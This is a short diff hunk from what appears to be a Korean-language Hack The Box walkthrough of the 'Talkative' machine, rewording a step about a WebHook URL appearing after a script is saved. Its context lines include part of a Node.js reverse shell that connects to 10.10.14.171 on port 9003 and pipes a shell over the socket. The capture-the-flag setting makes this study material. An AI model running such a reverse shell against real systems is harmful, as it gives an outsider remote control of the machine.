@@ -803,7 +803,7 @@ client.connect(9003, '10.10.14.171', function(){client.pipe(sh.stdin);sh.stdout.
 sh.stderr.pipe(client);});
 ```
 
-스크립트를 삽입한 이후, 아래쪽을 보면 `WebHook URL` 이 자동으로 생성된 것을 확인할 수 있다:
+스크립트를 삽입한 이후 `Save changes` 버튼을 클릭하면, 하단에 `WebHook URL` 이 자동으로 생성된 것을 확인할 수 있다:
 
 ![WebHook URL](/assets/htb-linux/talkative/webhook-url.png)
 
